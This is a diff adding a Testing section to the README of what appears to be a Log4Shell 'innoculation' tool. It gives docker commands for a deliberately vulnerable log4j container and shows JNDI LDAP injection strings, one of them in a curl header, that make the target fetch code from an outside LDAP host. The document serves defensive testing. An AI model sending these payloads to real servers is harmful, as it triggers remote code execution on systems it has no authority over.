@@ -30,3 +30,19 @@ You can expose this to the internet (if you like) by using ngrok.
  ```
  ${jndi:ldap://<ngrokurlgoeshere>:1389/a}
  ```
+
+## Testing
+There is a purposefully vulnerable version of log4j in a container available at:
+- https://github.com/christophetd/log4shell-vulnerable-app
+
+You can follow their instructions to start it and use it for testing:
+
+```
+docker build . -t vulnerable-app
+docker run -p 8080:8080 --name vulnerable-app vulnerable-app
+```
+
+And trigger the innoculation via:
+```
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-ip-address-or-dns-name:1389/a'
+```
